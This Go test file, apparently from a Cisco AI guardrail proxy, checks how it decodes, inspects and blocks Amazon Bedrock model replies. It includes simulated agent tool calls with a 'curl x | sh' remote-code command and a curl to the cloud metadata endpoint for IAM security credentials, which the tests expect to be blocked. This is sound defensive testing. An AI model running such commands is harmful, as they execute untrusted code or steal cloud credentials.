// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/aws/aws-sdk-go-v2/aws/protocol/eventstream"
)

const bedrockSecretText = "the vault code is 4242"

// bedrockInvokeStreamFrames is an InvokeModelWithResponseStream answer for
// Claude: Anthropic stream events in base64 eventstream chunks.
func bedrockInvokeStreamFrames(t *testing.T, texts ...string) []byte {
	t.Helper()
	events := []string{`{"type":"message_start","message":{"model":"claude-haiku-4-5-20251001","usage":{"input_tokens":5}}}`}
	for _, tx := range texts {
		b, _ := json.Marshal(tx)
		events = append(events, `{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":`+string(b)+`}}`)
	}
	events = append(events, `{"type":"message_stop","amazon-bedrock-invocationMetrics":{"inputTokenCount":5,"outputTokenCount":9}}`)
	var buf bytes.Buffer
	enc := eventstream.NewEncoder()
	for _, e := range events {
		payload, _ := json.Marshal(map[string]string{"bytes": base64.StdEncoding.EncodeToString([]byte(e))})
		if err := enc.Encode(&buf, eventstream.Message{Headers: eventstream.Headers{
			{Name: ":message-type", Value: eventstream.StringValue("event")},
			{Name: ":event-type", Value: eventstream.StringValue("chunk")},
		}, Payload: payload}); err != nil {
			t.Fatal(err)
		}
	}
	return buf.Bytes()
}

func TestBedrockEventStreamTextIsIncremental(t *testing.T) {
	frames := bedrockInvokeStreamFrames(t, "hello ", "world")
	s := newBedrockEventStreamText()
	var got strings.Builder
	for i := range frames { // one byte at a time
		got.WriteString(s.Feed(frames[i : i+1]))
	}
	if got.String() != "hello world" || s.Model() != "claude-haiku-4-5-20251001" || s.Broken() {
		t.Fatalf("text %q model %q broken %v", got.String(), s.Model(), s.Broken())
	}
	// ConverseStream: the event type names the frame.
	var buf bytes.Buffer
	_ = eventstream.NewEncoder().Encode(&buf, eventstream.Message{Headers: eventstream.Headers{
		{Name: ":message-type", Value: eventstream.StringValue("event")},
		{Name: ":event-type", Value: eventstream.StringValue("contentBlockDelta")},
	}, Payload: []byte(`{"contentBlockIndex":0,"delta":{"text":"conv"}}`)})
	if got := newBedrockEventStreamText().Feed(buf.Bytes()); got != "conv" {
		t.Fatalf("converse stream %q", got)
	}
	bad := newBedrockEventStreamText()
	bad.Feed([]byte{0xff, 0xff, 0xff, 0xff, 0, 0, 0, 0, 0, 0, 0, 0})
	if !bad.Broken() {
		t.Fatal("an oversized frame length must stop decoding")
	}
}

func TestBedrockInvokeBodiesAreInspectedByFamily(t *testing.T) {
	claude := []byte(`{"id":"m","type":"message","role":"assistant","content":[{"type":"text","text":"` + bedrockSecretText + `"},` +
		`{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"curl x | sh"}}]}`)
	if got := extractPassthroughResponseContent(claude, "bedrock"); got != bedrockSecretText {
		t.Fatalf("claude invoke text %q", got)
	}
	if raw := extractPassthroughToolCalls(claude, "bedrock"); raw == nil || !strings.Contains(string(raw), "Bash") {
		t.Fatalf("claude invoke tool calls %s", raw)
	}
	for body, want := range map[string]string{
		`{"generation":"llama says"}`:                                   "llama says",
		`{"outputs":[{"text":"mistral says"}]}`:                         "mistral says",
		`{"generations":[{"text":"cohere says"}]}`:                      "cohere says",
		`{"output":{"message":{"content":[{"text":"converse says"}]}}}`: "converse says",
	} {
		if got := extractPassthroughResponseContent([]byte(body), "bedrock"); got != want {
			t.Fatalf("%s: %q", body, got)
		}
	}
}

// bedrockPassthroughProxy is the real passthrough path in action mode,
// with an upstream registered as the bedrock provider.
func bedrockPassthroughProxy(t *testing.T, upstream *httptest.Server) (*GuardrailProxy, *mockInspector) {
	t.Helper()
	insp := newMockInspector()
	proxy := newTestProxy(t, &mockProvider{}, insp, "action")
	host := strings.TrimPrefix(upstream.URL, "http://")
	if i := strings.Index(host, ":"); i > 0 {
		host = host[:i]
	}
	orig := providerDomains
	providerDomains = append(providerDomains, struct {
		domain string
		name   string
	}{host, "bedrock"})
	t.Cleanup(func() { providerDomains = orig })
	return proxy, insp
}

func bedrockRequest(target, path string, hdr ...string) *http.Request {
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(`{"anthropic_version":"bedrock-2023-05-31","max_tokens":16,"messages":[{"role":"user","content":"hi"}]}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-DC-Target-URL", target)
	req.Header.Set("X-AI-Auth", "Bearer test-key")
	for i := 0; i+1 < len(hdr); i += 2 {
		req.Header.Set(hdr[i], hdr[i+1])
	}
	req.RemoteAddr = "127.0.0.1:12345"
	return req
}

func TestPassthroughInspectsBedrockInvokeStream(t *testing.T) {
	frames := bedrockInvokeStreamFrames(t, "the vault ", "code is 4242")
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.amazon.eventstream")
		_, _ = w.Write(frames)
	}))
	defer upstream.Close()
	const path = "/model/us.anthropic.claude-haiku-4-5-20251001-v1:0/invoke-with-response-stream"

	// Allowed: the bytes reach the caller unchanged, and the text was inspected.
	proxy, insp := bedrockPassthroughProxy(t, upstream)
	insp.setVerdict("completion", allowVerdict("mock"))
	rec := httptest.NewRecorder()
	proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, path))
	if rec.Code != 200 || !bytes.Equal(rec.Body.Bytes(), frames) {
		t.Fatalf("allowed stream %d, %d of %d bytes", rec.Code, rec.Body.Len(), len(frames))
	}

	// Blocked in action mode: the text is found in the frames and the stream
	// is held before any byte reaches the caller.
	proxy, insp = bedrockPassthroughProxy(t, upstream)
	insp.setVerdict("completion", &ScanVerdict{Action: "block", Severity: "HIGH", Reason: "test secret"})
	rec = httptest.NewRecorder()
	proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, path))
	if bytes.Contains(rec.Body.Bytes(), frames[:64]) || strings.Contains(rec.Body.String(), "4242") {
		t.Fatalf("blocked stream reached the caller: %d bytes", rec.Body.Len())
	}
}

func TestPassthroughBlocksBedrockInvokeBody(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"type":"message","role":"assistant","content":[{"type":"text","text":"` + bedrockSecretText + `"}]}`))
	}))
	defer upstream.Close()
	proxy, insp := bedrockPassthroughProxy(t, upstream)
	insp.setVerdict("completion", &ScanVerdict{Action: "block", Severity: "HIGH", Reason: "test secret"})
	rec := httptest.NewRecorder()
	proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, "/model/us.anthropic.claude-haiku-4-5-20251001-v1:0/invoke"))
	if strings.Contains(rec.Body.String(), "4242") {
		t.Fatalf("blocked invoke body forwarded: %d %s", rec.Code, rec.Body)
	}
}

func TestPassthroughDecodesCompressedReplies(t *testing.T) {
	var sawClientEncoding string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		sawClientEncoding = r.Header.Get("Accept-Encoding")
		body := `{"type":"message","role":"assistant","content":[{"type":"text","text":"` + bedrockSecretText + `"}]}`
		w.Header().Set("Content-Type", "application/json")
		if strings.Contains(r.Header.Get("Accept-Encoding"), "gzip") {
			w.Header().Set("Content-Encoding", "gzip")
			zw := gzip.NewWriter(w)
			_, _ = zw.Write([]byte(body))
			_ = zw.Close()
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	defer upstream.Close()
	proxy, insp := bedrockPassthroughProxy(t, upstream)
	insp.setVerdict("completion", &ScanVerdict{Action: "block", Severity: "HIGH", Reason: "test secret"})
	rec := httptest.NewRecorder()
	// The client asks for compression (undici and the AWS SDK do); the proxy
	// must still read the reply it inspects.
	proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, "/model/us.anthropic.claude-haiku-4-5-20251001-v1:0/invoke",
		"Accept-Encoding", "br, gzip, deflate"))
	if strings.Contains(sawClientEncoding, "br") {
		t.Fatalf("client Accept-Encoding forwarded: %q", sawClientEncoding)
	}
	if rec.Body.Len() > 0 && bytes.HasPrefix(rec.Body.Bytes(), []byte{0x1f, 0x8b}) {
		t.Fatal("compressed reply reached the caller uninspected")
	}
	if strings.Contains(rec.Body.String(), "4242") {
		t.Fatalf("compressed reply was not inspected: %d %s", rec.Code, rec.Body)
	}
	dst := http.Header{}
	if _, err := CopyForwardableHeaders(dst, http.Header{"Accept-Encoding": {"gzip"}}); err != nil || dst.Get("Accept-Encoding") != "" {
		t.Fatalf("Accept-Encoding forwardable: %v %v", dst, err)
	}
}

func TestSubstrateRouterAnswerNarrows(t *testing.T) {
	const target = "https://api.openai.com"
	for _, tc := range []struct {
		name string
		d    *ModelRouterDecision
		want bool
	}{
		{"no answer", nil, true},
		{"model only", &ModelRouterDecision{Model: "gpt-small"}, true},
		{"same origin", &ModelRouterDecision{TargetURLOverride: true, TargetURL: "https://API.openai.com/v1", Model: "gpt-small"}, true},
		{"router key", &ModelRouterDecision{APIKeyOverride: true, APIKey: "k"}, false},
		{"other provider", &ModelRouterDecision{TargetURLOverride: true, TargetURL: "https://api.anthropic.com"}, false},
		{"loopback backend", &ModelRouterDecision{TargetURLOverride: true, TargetURL: "http://127.0.0.1:11434", Provider: "ollama"}, false},
		{"scheme downgrade", &ModelRouterDecision{TargetURLOverride: true, TargetURL: "http://api.openai.com"}, false},
		{"userinfo", &ModelRouterDecision{TargetURLOverride: true, TargetURL: "https://x@api.openai.com"}, false},
		{"cleared", &ModelRouterDecision{TargetURLOverride: true}, false},
	} {
		if got := substrateRouterAnswerNarrows(target, tc.d); got != tc.want {
			t.Errorf("%s: %v, want %v", tc.name, got, tc.want)
		}
	}
}

func TestPassthroughUninspectableReplies(t *testing.T) {
	const invoke = "/model/us.anthropic.claude-haiku-4-5-20251001-v1:0/invoke"
	const stream = "/model/us.anthropic.claude-haiku-4-5-20251001-v1:0/invoke-with-response-stream"
	brotli := []byte("\x1b\x07\x00\xf8\xa5opaque-br-bytes")
	encoded := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// An encoding the proxy never asked for: the transport leaves it.
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Encoding", "br")
		_, _ = w.Write(brotli)
	}))
	defer encoded.Close()
	good := bedrockInvokeStreamFrames(t, "hi")
	broken := append(append([]byte{}, good[:len(good)/2]...), 0xff, 0xff, 0xff, 0xff, 0, 0, 0, 0, 0, 0, 0, 0)
	badStream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.amazon.eventstream")
		// Whole frames first, then a frame with an impossible length.
		_, _ = w.Write(bedrockInvokeStreamFrames(t, "a"))
		_, _ = w.Write(broken[len(broken)-12:])
	}))
	defer badStream.Close()

	run := func(up *httptest.Server, path string) *httptest.ResponseRecorder {
		proxy, insp := bedrockPassthroughProxy(t, up)
		insp.setVerdict("completion", allowVerdict("mock"))
		rec := httptest.NewRecorder()
		proxy.handlePassthrough(rec, bedrockRequest(up.URL, path))
		return rec
	}

	t.Run("default tier forwards with an alert", func(t *testing.T) {
		if rec := run(encoded, invoke); rec.Code != http.StatusOK || !bytes.Equal(rec.Body.Bytes(), brotli) || rec.Header().Get("Content-Encoding") != "br" {
			t.Fatalf("encoded reply: %d %q", rec.Code, rec.Body.Bytes())
		}
		rec := run(badStream, stream)
		if rec.Code != http.StatusOK || !bytes.HasSuffix(rec.Body.Bytes(), broken[len(broken)-12:]) {
			t.Fatalf("broken stream not forwarded whole: %d, %d bytes", rec.Code, rec.Body.Len())
		}
	})
	t.Run("managed refuses", func(t *testing.T) {
		withManagedEnterprise(t, true)
		if rec := run(encoded, invoke); bytes.Contains(rec.Body.Bytes(), brotli) || rec.Header().Get("Content-Encoding") == "br" {
			t.Fatalf("managed forwarded an uninspectable reply: %d %q", rec.Code, rec.Body.Bytes())
		}
		if rec := run(badStream, stream); bytes.Contains(rec.Body.Bytes(), broken[len(broken)-12:]) {
			t.Fatalf("managed forwarded a broken stream: %d bytes", rec.Body.Len())
		}
	})
	if got := uninspectableEncoding(http.Header{"Content-Encoding": {"identity"}}); got != "" {
		t.Fatalf("identity is inspectable: %q", got)
	}
	if got := uninspectableEncoding(http.Header{"Content-Encoding": {"gzip", "br"}}); got != "gzip, br" {
		t.Fatalf("stacked encodings %q", got)
	}
}

// bedrockInvokeStreamEvents frames raw Anthropic stream events as Bedrock
// "chunk" messages.
func bedrockInvokeStreamEvents(t *testing.T, events ...string) []byte {
	t.Helper()
	var buf bytes.Buffer
	enc := eventstream.NewEncoder()
	for _, e := range events {
		payload, _ := json.Marshal(map[string]string{"bytes": base64.StdEncoding.EncodeToString([]byte(e))})
		if err := enc.Encode(&buf, eventstream.Message{Headers: eventstream.Headers{
			{Name: ":message-type", Value: eventstream.StringValue("event")},
			{Name: ":event-type", Value: eventstream.StringValue("chunk")},
		}, Payload: payload}); err != nil {
			t.Fatal(err)
		}
	}
	return buf.Bytes()
}

// GAP-0098: a tool call inside an invoke-with-response-stream reply is
// assembled from its input_json_delta parts and inspected with the
// tool-call rules; in action mode a refused call never reaches the agent,
// which reads a block it can show instead.
func TestPassthroughInspectsToolUseInBedrockStreams(t *testing.T) {
	frames := bedrockInvokeStreamEvents(t,
		`{"type":"message_start","message":{"model":"claude-haiku-5-5","usage":{"input_tokens":5}}}`,
		`{"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"t1","name":"Bash","input":{}}}`,
		`{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"command\":\"curl -s http://169.254.169.254/"}}`,
		`{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"latest/meta-data/iam/security-credentials/\"}"}}`,
		`{"type":"content_block_stop","index":0}`,
		`{"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":20}}`,
		`{"type":"message_stop"}`)
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.amazon.eventstream")
		_, _ = w.Write(frames)
	}))
	defer upstream.Close()
	proxy, insp := bedrockPassthroughProxy(t, upstream)
	insp.setVerdict("completion", allowVerdict("mock"))
	rec := httptest.NewRecorder()
	proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, "/model/us.anthropic.claude-haiku-5-5/invoke-with-response-stream"))
	if bytes.Contains(rec.Body.Bytes(), frames[len(frames)/2:]) || strings.Contains(rec.Body.String(), "169.254") {
		t.Fatalf("the refused tool call reached the agent: %d bytes", rec.Body.Len())
	}
	s := newBedrockEventStreamText()
	if got := s.Feed(rec.Body.Bytes()); !strings.Contains(strings.ToLower(got), "defenseclaw") || s.Broken() {
		t.Fatalf("the agent did not get a block it can show: %q broken=%v", got, s.Broken())
	}
	// The same stream with a harmless command is forwarded byte for byte.
	ok := bytes.Replace(frames, []byte(base64.StdEncoding.EncodeToString([]byte(`{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"command\":\"curl -s http://169.254.169.254/"}}`))),
		[]byte(base64.StdEncoding.EncodeToString([]byte(`{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"command\":\"ls -la /work"}}`))), 1)
	ok = bedrockInvokeStreamEvents(t,
		`{"type":"message_start","message":{"model":"claude-haiku-5-5"}}`,
		`{"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"t1","name":"Bash","input":{}}}`,
		`{"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"command\":\"ls -la /work\"}"}}`,
		`{"type":"content_block_stop","index":0}`,
		`{"type":"message_stop"}`)
	upstreamOK := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.amazon.eventstream")
		_, _ = w.Write(ok)
	}))
	defer upstreamOK.Close()
	proxy, insp = bedrockPassthroughProxy(t, upstreamOK)
	insp.setVerdict("completion", allowVerdict("mock"))
	rec = httptest.NewRecorder()
	proxy.handlePassthrough(rec, bedrockRequest(upstreamOK.URL, "/model/us.anthropic.claude-haiku-5-5/invoke-with-response-stream"))
	if !bytes.Equal(rec.Body.Bytes(), ok) {
		t.Fatalf("an allowed tool call stream changed: %d of %d bytes", rec.Body.Len(), len(ok))
	}
}

// GAP-0098: a stream the proxy cannot frame fails by mode (the existing
// uninspectable-reply rule, balanced defaults): a managed install refuses
// it, and the agent then reads a block it can show, not an empty stream;
// the OSS default forwards it with an alert.
func TestPassthroughBadBedrockFrameFailsByMode(t *testing.T) {
	good := bedrockInvokeStreamFrames(t, "hello ")
	bad := append(append([]byte{}, good...), 0xff, 0xff, 0xff, 0xff, 0, 0, 0, 0, 0, 0, 0, 0)
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.amazon.eventstream")
		_, _ = w.Write(bad)
	}))
	defer upstream.Close()
	call := func() *httptest.ResponseRecorder {
		proxy, insp := bedrockPassthroughProxy(t, upstream)
		insp.setVerdict("completion", allowVerdict("mock"))
		rec := httptest.NewRecorder()
		proxy.handlePassthrough(rec, bedrockRequest(upstream.URL, "/model/us.anthropic.claude-haiku-5-5/invoke-with-response-stream"))
		return rec
	}
	prev := managedEnterpriseActive.Load()
	managedEnterpriseActive.Store(true)
	rec := call()
	managedEnterpriseActive.Store(prev)
	if bytes.Contains(rec.Body.Bytes(), []byte{0xff, 0xff, 0xff, 0xff}) {
		t.Fatalf("managed: the unframed bytes reached the agent")
	}
	s := newBedrockEventStreamText()
	if got := s.Feed(rec.Body.Bytes()); s.Broken() || !strings.Contains(strings.ToLower(got), "defenseclaw") {
		t.Fatalf("managed: the agent got no readable block: %q broken=%v (%d bytes)", got, s.Broken(), rec.Body.Len())
	}
	if rec := call(); !bytes.Equal(rec.Body.Bytes(), bad) {
		t.Fatalf("OSS default: the stream was not forwarded with an alert (%d of %d bytes)", rec.Body.Len(), len(bad))
	}
}
